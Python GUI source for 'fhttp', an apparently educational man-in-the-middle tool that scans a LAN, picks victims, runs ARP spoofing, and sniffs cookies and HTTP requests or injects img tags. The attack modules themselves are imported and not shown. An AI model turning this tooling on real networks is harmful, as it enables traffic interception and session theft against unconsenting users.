# fhttp - An application which is capable of exploiting techniques such as ARP cache poisoning,
# and which uses the positions acquired by exploiting these vulnerabilities for things such as stealing insecure cookies
# Abdel K. Bokharouss & Adriaan Knapen
# MIT license

import os
import socket
import tkFont as tkfont
import tkMessageBox
import webbrowser
from Tkinter import *
from collections import OrderedDict
from tkSimpleDialog import askstring
from ttk import Notebook
from ttk import Style

from PacketHandler.Filters.cookie_filter import CookieFilter
from PacketHandler.Filters.http_request_filter import HttpRequestFilter
from PacketHandler.Filters.tcp_regex_filter import TcpRegexFilter
from PacketHandler.Injectors.accept_encoding_substituter import AcceptEncodingSubstituter
from PacketHandler.Injectors.img_tag_injector import ImgTagInjector
from PacketHandler.packet_sniffer import PacketSniffer
from arp_spoof import ArpSpoof
from network_discoverer import NetworkDiscoverer

__authors__ = "\n".join(['Abdel K. Bokharouss',
                         'Adriaan Knapen'])

# Directories (paths)
script_dir = os.path.dirname(os.path.realpath(__file__))
media_dir = script_dir + os.path.sep + 'media'


class MainApplication(Tk):

    def __init__(self, network_discoverer):
        Tk.__init__(self)
        self.winfo_toplevel().title("fHTTP")
        self.title_font = tkfont.Font(family='Helvetica', size=14, weight='bold', slant='italic')
        self.h2_font = tkfont.Font(family='Helvetica', size=12, weight='bold')
        self.h3_font = tkfont.Font(family='Helvetica', size=11, weight='bold')
        self.network_discoverer = network_discoverer
        self.own_mac_address = network_discoverer.get_own_mac_address()
        self.own_ip_address = network_discoverer.get_own_ip_address()
        self.ip_to_mac = None
        self.ip_to_mac_record = None
        self.configure(background='darkgrey')

        self.is_spoofing = self.is_extracting = self.is_filtering = False
        self.verbose_mode = False  # verbose mode on/off for output frame

        self.victims = None
        self.target = None

        width = int(self.winfo_screenwidth() * 0.5)
        height = int(self.winfo_screenheight() * 0.8)
        x_start = int(self.winfo_screenwidth() * 0.25)
        y_start = int(self.winfo_screenheight() * 0.1)
        self.geometry('%dx%d+%d+%d' % (width, height, x_start, y_start))
        self.resizable(0, 0)  # do not feel like dealing with resizable frames
        self.conf_menu_bar()  # configure menu-bar

        img_icon = PhotoImage(file=media_dir + os.path.sep + 'fhttp_logo.ico')
        self.tk.call('wm', 'iconphoto', self._w, img_icon)

        for row in range(0, 100):
            self.rowconfigure(row, weight=1)
            self.columnconfigure(row, weight=1)

        # notebook configuration (tabs)
        style = Style()
        style.theme_settings("default", {
            "TNotebook": {"configure": {"tabmargins": [0, 0, 0, 0]}},
            "TNotebook.Tab": {"configure": {"padding": [8, 1, 8, 1]}}})
        self.notebook = Notebook(self)
        self.notebook.grid(row=1, column=0, columnspan=100, rowspan=10, sticky='nesw', padx=5)

        # output frame configuration
        self.output = OutputFrame(parent=self)
        self.output.grid(row=13, column=0, columnspan=100, rowspan=85, sticky='nesw', padx=5)

        # notebook frames
        self.tabs = {}
        self.tab_mapping = OrderedDict([
            (StartFrame, 'Start'),
            (LocalNetworkScanFrame, 'Local Network Scan'),
            (ARPSpoofFrame, 'ARP Spoofing'),
            (InjectorExtractorFrame, 'Injection and Extraction')
        ])
        for tab in self.tab_mapping.keys():
            tab_frame_name = self.tab_mapping[tab]
            frame = tab(parent=self.notebook, controller=self)
            self.notebook.add(frame, text=tab_frame_name)
            self.tabs[tab.__name__] = frame

        self.notebook.tab(self.notebook.index(self.tabs['InjectorExtractorFrame']), state=DISABLED)

        tkMessageBox.showinfo("fHTTP", "\n\n\nWelcome to fhttp\n\n"
                                       "We inherently trust no one, including each other\n\n\n".ljust(500))

    def conf_menu_bar(self):
        menu_bar = Menu(self)
        # help menu
        help_menu = Menu(menu_bar, tearoff=0)
        help_menu.add_command(label='About', command=self.display_about)
        help_menu.add_command(label='Support and Documentation', command=self.display_support_doc)
        # help_menu.add_separator()
        menu_bar.add_cascade(label='Help', menu=help_menu)

        menu_bar.add_command(label='Exit', command=self.quit)
        self.config(menu=menu_bar)

    def clean_output_and_attack_frame(self):
        self.output = OutputFrame(parent=self)
        self.output.grid(row=13, column=0, columnspan=100, rowspan=85, sticky='nesw', padx=5)

    @staticmethod
    def display_about():
        tkMessageBox.showinfo("About",
                              "fhttp is an application which is capable of exploiting vulnerabilities "
                              "such as ARP cache poisoning. The (man-in-the-middle) positions that are acquired "
                              "through the exploitation of these vulnerabilities are then used for things such as "
                              "packet-sniffing, the `theft' of (insecure) cookies and img-tag-injection\n\n"
                              "Abdel K. Bokharouss and Adriaan Knapen \n")

    @staticmethod
    def display_support_doc():
        webbrowser.open('https://github.com/akbokha/fhttp')

    def show_frame(self, page_name, select=True, update=False):
        frame = self.tabs[page_name]
        if update:
            try:
                frame.update()
            except AttributeError:
                pass
        if select:
            self.notebook.select(self.notebook.index(frame))

    def scan_and_update(self):
        self.ip_to_mac_record = self.network_discoverer.get_ip_to_mac_mapping(update=True)
        self.ip_to_mac = self.ip_to_mac_record.get_all()


class OutputFrame(Canvas):
    status = '[status] '
    output = '[output] '

    def __init__(self, parent):
        Canvas.__init__(self, parent)
        scroll = Scrollbar(self, orient=VERTICAL)
        scroll.pack(side=RIGHT, fill=Y)
        scroll.config(command=self.yview)
        self.configure(bg='black', yscrollcommand=scroll.set)
        self.no_status = 'no status to display'
        self.status_text = self.no_status
        self.pack_propagate(False)  # do not let it expand
        self.status_message = Message(self, anchor=W, width=1200, text=self.status.__add__(self.status_text))
        self.status_message.config(bg='black', foreground='white')
        self.status_message.pack(side=TOP, anchor=W, fill=X)

        self.output_text = 'no output to display'
        self.output_message = Message(self, anchor=W, width=1200, text=self.output.__add__(self.output_text))
        self.output_message.config(bg='black', foreground='white')
        self.output_message.pack(side=TOP, anchor=W, fill=X)

    def update_status(self, message, append=False):
        if type(message) is str:  # single string
            if append:
                self.status_text += message
            else:
                self.status_text = message
            self.status_message.configure(text=self.status.__add__(self.status_text))
            self.update()
        else:  # to-do: figure out how to handle list/collection of strings in an elegant way
            pass

    def update_output(self, message, append=False):
        if type(message) is str:  # single string
            if append:
                self.output_text += message
            else:
                self.output_text = message
            self.output_message.configure(text=self.output.__add__(self.output_text))
            self.update()
        else:  # to-do: figure out how to handle list/collection of strings in an elegant way
            pass


# Start tab frames
class StartFrame(Frame):

    def __init__(self, parent, controller):
        Frame.__init__(self, parent)
        self.controller = controller

        # welcome text start page
        label_welcome = Label(self, text='Welcome to fhttp\n'
                                         'We inherently trust no one, including each other',
                              font=controller.title_font)
        label_welcome.pack(side='top', pady=20)

        self.img_icon = PhotoImage(file=media_dir + os.path.sep + 'fhttp_logo.png')
        img_panel = Label(self, image=self.img_icon)
        img_panel.pack(side='top', pady=10)

        button_scan = Button(self, text="Start exploring the local network",
                             command=lambda: controller.show_frame("LocalNetworkScanFrame"))
        button_scan.pack(side='top')


class LocalNetworkScanFrame(Frame):

    def __init__(self, parent, controller, reset=FALSE):
        Frame.__init__(self, parent)
        self.controller = controller
        label_scan = Label(self, text='Let\'s check who/what is connected to the local network',
                           font=controller.h2_font)
        label_scan.pack(side='top', pady=20)
        button_scan = Button(self, text="Scan local network",
                             command=lambda: self.scan_and_update_list())
        button_scan.pack()

        self.listbox = Listbox(self, width=50, selectmode=MULTIPLE)
        self.listbox.pack(side='top', pady=10)

        self.button_select_item = Button(self, text="Set as Victim(s)",
                                         command=lambda: self.set_victim())
        self.button_select_item.pack(pady=5)

        self.button_reset_config = Button(self, text="Reset Configuration",
                                          command=lambda: self.reset_network_scan())
        self.button_reset_config.pack(pady=5)

    def scan_and_update_list(self):
        self.controller.output.update_status('Scanning the local network ...')
        self.listbox.delete(0, END)  # clear entries
        self.controller.scan_and_update()
        self.controller.output.update_status('Local network scan complete')
        for item in self.controller.ip_to_mac.keys():
            self.listbox.insert(END, (item + " - " + self.controller.ip_to_mac[item]))

    def set_victim(self):
        self.listbox.configure(selectmode=SINGLE)  # allow the specification of a single target only
        list_items = self.listbox.curselection()
        list_items = [int(item) for item in list_items]
        num_items = len(list_items)
        if num_items > 0:  # an item is selected
            self.controller.victims = []
            self.controller.victims.append(self.get_ip_address(str(self.listbox.get(list_items[0]))))
            self.controller.output.update_status("Victim: " + self.controller.victims[0], append=False)
            if num_items > 1:  # multiple items
                for i in range(1, num_items):
                    self.controller.victims.append(self.get_ip_address(str(self.listbox.get(list_items[i]))))
                    self.controller.output.update_status(", Victim: " + self.controller.victims[i], append=True)
            self.listbox.selection_clear(0, END)
            self.button_select_item.configure(text="Set as Target", command=lambda: self.set_target())

    def set_target(self):
        list_items = self.listbox.curselection()
        list_items = [int(item) for item in list_items]
        if len(list_items) > 0:  # an item is selected
            self.controller.target = self.get_ip_address(str(self.listbox.get(list_items[0])))
            self.listbox.selection_clear(0, END)
            self.controller.output.update_status(", Target: " + self.controller.target, append=True)
            self.button_select_item.configure(text="Start ARP spoofing",
                                              command=lambda: self.start_spoofing())

    def start_spoofing(self):
        self.listbox.configure(selectmode=MULTIPLE)
        self.button_select_item.configure(text="Set as Victim",
                                          command=lambda: self.set_victim())
        self.controller.show_frame("ARPSpoofFrame", update=True)

    def reset_network_scan(self):
        self.listbox.delete(0, END)  # clear entries
        self.listbox.configure(selectmode=MULTIPLE)
        self.button_select_item.configure(text="Set as Victim", command=lambda: self.set_victim())
        self.controller.output.update_status(self.controller.output.no_status, append=False)

    @staticmethod
    def get_ip_address(str_value):
        index = str_value.find('-')
        return str_value[:(index - 1)]

    def update(self):
        self.reset_network_scan()


class ARPSpoofFrame(Frame):

    def __init__(self, parent, controller):
        Frame.__init__(self, parent)
        self.controller = controller
        self.parent = parent
        self.arp = None

        label = Label(self, text='Identify the target and victim who need to be spoofed',
                      font=controller.h2_font)
        label.pack(side='top', pady=20)

        label_ip_victim = Label(self, text="Victim(s) IP Address (sep =','): ").pack(pady=5)
        self.entry_ip_victim = Entry(self, width=35)
        self.entry_ip_victim.pack()

        label_ip_target = Label(self, text='Target IP Address: ').pack(pady=5)
        self.entry_ip_target = Entry(self, width=35)
        self.entry_ip_target.pack()

        self.button_ARP = Button(self, text="Start ARP Spoofing",
                                 command=lambda: self.start_spoofing(self.entry_ip_victim.get(),
                                                                     self.entry_ip_target.get()))
        self.button_ARP.pack(pady=10)

        self.button_reset_config = Button(self, text="Reset Configuration",
                                          command=lambda: controller.show_frame("LocalNetworkScanFrame", update=True))
        self.button_reset_config.pack(pady=7)

        self.button_start_injecting_extracting = Button(self, text="Start Injecting and/or Extracting",
                                                        command=lambda: controller.show_frame("InjectorExtractorFrame",
                                                                                              update=True),
                                                        state=DISABLED)
        self.button_start_injecting_extracting.pack(pady=7)

    def update(self):
        if self.controller.is_spoofing:
            self.stop_spoofing(status_update=False)
        if self.controller.victims is not None:
            self.entry_ip_victim.delete(0, END)  # clear entry
            num_items = len(self.controller.victims)
            self.entry_ip_victim.insert(0, self.controller.victims[0])
            if num_items > 1:
                for i in range(1, num_items):
                    self.entry_ip_victim.insert(END, ", ".__add__(self.controller.victims[i]))
        if self.controller.target is not None:
            self.entry_ip_target.delete(0, END)
            self.entry_ip_target.insert(0, self.controller.target)

    def start_spoofing(self, vIP, tIP):
        victims = [vic.strip() for vic in vIP.split(',')]
        if ARPSpoofFrame.are_valid_ip_address(victims) and ARPSpoofFrame.are_valid_ip_address([tIP]):
            self.button_ARP.configure(text="Stop ARP Spoofing", command=lambda: self.stop_spoofing())
            self.controller.is_spoofing = True
            self.arp = ArpSpoof()
            for vic in victims:
                self.arp.attach(vic)
            self.arp.attach(tIP)
            self.controller.output.update_status('ARP Spoofing ' + vIP + " and " + tIP, append=False)
            self.button_start_injecting_extracting.configure(state=NORMAL)
            self.controller.notebook.tab(self.controller.notebook.index(self.controller.tabs['InjectorExtractorFrame']),
                                         state=NORMAL)
            self.arp.start()
        else:
            tkMessageBox.showerror("Specify the target and victim",
                                   "Please specify the IP addresses of the victim and target and check whether the IP "
                                   "address notation is correct")

    def stop_spoofing(self, status_update=True):
        self.button_ARP.configure(text="Start ARP Spoofing",
                                  command=lambda: self.start_spoofing(self.entry_ip_victim.get(),
                                                                      self.entry_ip_target.get()))
        if status_update:
            self.controller.output.update_status("ARP Spoofing thread terminated", append=False)
        self.button_start_injecting_extracting.configure(state=DISABLED)
        self.controller.notebook.tab(self.controller.notebook.index(self.controller.tabs['InjectorExtractorFrame']),
                                     state=DISABLED)
        self.controller.is_spoofing = False
        self.arp.keep_alive = False

    @staticmethod
    def are_valid_ip_address(addresses):
        for add in addresses:
            if not (ARPSpoofFrame.is_valid_ipv4_address(add) or ARPSpoofFrame.is_valid_ipv6_address(add)):
                return False
        return True

    # Copied from tzot's answer - https://stackoverflow.com/questions/319279/how-to-validate-ip-address-in-python
    @staticmethod
    def is_valid_ipv4_address(address):
        try:
            socket.inet_pton(socket.AF_INET, address)
        except AttributeError:  # no inet_pton here, sorry
            try:
                socket.inet_aton(address)
            except socket.error:
                return False
            return address.count('.') == 3
        except socket.error:  # not a valid address
            return False
        return True

    @staticmethod
    def is_valid_ipv6_address(address):
        try:
            socket.inet_pton(socket.AF_INET6, address)
        except socket.error:  # not a valid address
            return False
        return True


class InjectorExtractorFrame(Frame):

    def __init__(self, parent, controller):
        Frame.__init__(self, parent)
        self.controller = controller
        self.parent = parent

        label_frame_purpose = Label(self, text='Please specify the filters and/or injectors one would like to employ',
                                    font=controller.h2_font)
        label_frame_purpose.pack(side='top', pady=10)

        self.packet_sniffer = None

        self.filters = {}
        self.injectors = {}

        self.cookie_filter = CookieFilter()
        self.http_request_filter = HttpRequestFilter()
        self.tcp_reg_ex_filter = None  # TcpRegexFilter()

        self.image_injector = None  # ImgTagInjector()
        self.accept_encoding_injector = None  # AcceptEncodingSubstituter()

        label_filters = Label(self, text='Active filters',
                              font=controller.h3_font)
        label_filters.pack(pady=2)

        self.cookie_filter_var = IntVar()
        self.cookie_filter_box = Checkbutton(self, text="Cookies", variable=self.cookie_filter_var, onvalue=1,
                                             offvalue=0, command=lambda: self.update_filters("Cookies"),
                                             height=2, width=30)
        self.cookie_filter_box.pack()
        self.filters["Cookies"] = [self.cookie_filter, self.cookie_filter_var]

        self.http_request_var = IntVar()
        self.http_request_filter_box = Checkbutton(self, text="HTTP Request", variable=self.http_request_var, onvalue=1,
                                                   offvalue=0, command=lambda: self.update_filters("HTTP Request"),
                                                   height=2, width=30)
        self.http_request_filter_box.pack()
        self.filters["HTTP Request"] = [self.http_request_filter, self.http_request_var]

        self.tcp_reg_ex_var = IntVar()
        self.tcp_reg_ex_filter_box = Checkbutton(self, text="TCP RegEX (Advanced Users)", variable=self.tcp_reg_ex_var,
                                                 onvalue=1,
                                                 offvalue=0, command=lambda: self.update_tcp_reg_ex("TCP RegEX"),
                                                 height=2, width=30)
        self.tcp_reg_ex_filter_box.pack()
        self.filters["TCP RegEX"] = [self.tcp_reg_ex_filter, self.tcp_reg_ex_var]

        self.label_injectors = Label(self, text='Active injectors',
                                     font=controller.h3_font)
        self.label_injectors.pack(side='top', pady=2)

        self.img_tag_inj_var = IntVar()
        self.img_tag_inj_box = Checkbutton(self, text="IMG-tag Injector (Advanced Users)",
                                           variable=self.img_tag_inj_var, onvalue=1,
                                           offvalue=0, command=lambda: self.update_img_tag_injector("IMG-tag"),
                                           height=2, width=40)
        self.img_tag_inj_box.pack()
        self.injectors["IMG-tag"] = [self.image_injector, self.img_tag_inj_var]

        self.accept_enc_inj_var = IntVar()
        self.accept_enc_inj_box = Checkbutton(self, text="Accept-Encoding Injector (Advanced Users)",
                                              variable=self.accept_enc_inj_var,
                                              onvalue=1, command=lambda: self.update_accept_encoding("Accept-Encoding"),
                                              offvalue=0,
                                              height=2, width=40)
        self.accept_enc_inj_box.pack()
        self.injectors["Accept-Encoding"] = [self.accept_encoding_injector, self.accept_enc_inj_var]

        self.button_ARP = Button(self, text="Stop Spoofing and Attack(s)",
                                 command=lambda: self.terminate_injections_filtering(reset_config=False))
        self.button_ARP.pack(pady=5)

        self.button_reset_config = Button(self, text="Stop and Reset Configuration",
                                          command=lambda: self.terminate_injections_filtering(reset_config=True))
        self.button_reset_config.pack(pady=5)

    def terminate_injections_filtering(self, reset_config=False):
        if reset_config:
            self.controller.clean_output()
            self.controller.output.update()
            self.clean_up()
            self.controller.show_frame('ARPSpoofFrame', select=False, update=True)
        else:
            self.controller.show_frame('ARPSpoofFrame', update=True)

    def clean_up(self):
        if self.accept_enc_inj_var.get() == 1:
            self.accept_enc_inj_var.set(0)
            self.update_accept_encoding("Accept-Encoding")
        if self.img_tag_inj_var.get() == 1:
            self.img_tag_inj_var.set(0)
            self.update_img_tag_injector("IMG-tag")
        if self.tcp_reg_ex_var.get() == 1:
            self.tcp_reg_ex_var.set(0)
            self.update_tcp_reg_ex("TCP RegEX")
        if self.http_request_var.get() == 1:
            self.http_request_var.set(0)
            self.update_filters("HTTP Request")
        if self.cookie_filter_var.get() == 1:
            self.cookie_filter_var.set(0)
            self.update_filters("Cookies")

    def update_filters(self, filter_name):
        filter = self.filters[filter_name][0]
        value = self.filters[filter_name][1]
        if value.get() == 1:
            print("turn on ", filter_name)
            self.packet_sniffer.packet_filter.attach(filter)
        elif value.get() == 0:
            print("turn off ", filter_name)
            self.packet_sniffer.packet_filter.detach(filter)

    def update_injectors(self, injector_name):
        injector = self.injectors[injector_name][0]
        value = self.injectors[injector_name][1]
        if value.get() == 1:
            print("turn on ", injector_name)
            self.packet_sniffer.packet_injectors.append(injector)
        elif value.get() == 0:
            print("turn off ", injector_name)
            self.packet_sniffer.packet_injectors.remove(injector)

    def update_tcp_reg_ex(self, filter_name):
        filter = self.filters[filter_name][0]
        value = self.filters[filter_name][1]
        if value.get() == 1:
            regex = askstring("Input needed", "Please specify the regular expression")
            self.tcp_reg_ex_filter = TcpRegexFilter(regex)
            self.filters[filter_name][0] = self.tcp_reg_ex_filter
            self.packet_sniffer.packet_filter.attach(filter)
            print("turn off ", filter_name, " input: ", regex)
        elif value.get() == 0:
            print("turn off ", filter_name)
            self.packet_sniffer.packet_filter.detach(filter)

    def update_img_tag_injector(self, injector_name):
        injector = self.injectors[injector_name][0]
        value = self.injectors[injector_name][1]
        if value.get() == 1:
            injection = askstring("Input needed", "Please specify the to be injected string",
                                  initialvalue=self.controller.target
                                  )
            self.image_injector = ImgTagInjector(injection)
            self.injectors[injector_name][0] = self.image_injector
            self.packet_sniffer.packet_injectors.append(self.image_injector)
            print("turn off ", injector_name, " input: ", injection)
        elif value.get() == 0:
            print("turn off ", injector_name)
            self.packet_sniffer.packet_injectors.remove(injector)

    def update_accept_encoding(self, injector_name):
        injector = self.injectors[injector_name][0]
        value = self.injectors[injector_name][1]
        if value.get() == 1:
            injection = askstring("Input needed", "Please specify the accepted encoding",
                                  initialvalue=AcceptEncodingSubstituter.no_compression_string)
            self.accept_encoding_injector = AcceptEncodingSubstituter(injection)
            self.injectors[injector_name][0] = self.accept_encoding_injector
            self.packet_sniffer.packet_injectors.append(self.accept_encoding_injector)
            print("turn off ", injector_name, " input: ", injection)
        elif value.get() == 0:
            print("turn off ", injector_name)
            self.packet_sniffer.packet_injectors.remove(injector)

    def update(self):
        print("sniffer specified")
        self.packet_sniffer = PacketSniffer(attacker_ips=[self.controller.own_ip_address],
                                            ip_to_mac=self.controller.ip_to_mac,
                                            output_frame=self.controller.output,
                                            verbose_mode=self.controller.verbose_mode)
        self.packet_sniffer.start()


def main():
    network_discoverer = NetworkDiscoverer()
    init_gui(network_discoverer)


def init_gui(network_discoverer):
    main_app = MainApplication(network_discoverer)
    main_app.mainloop()


if __name__ == '__main__':
    main()
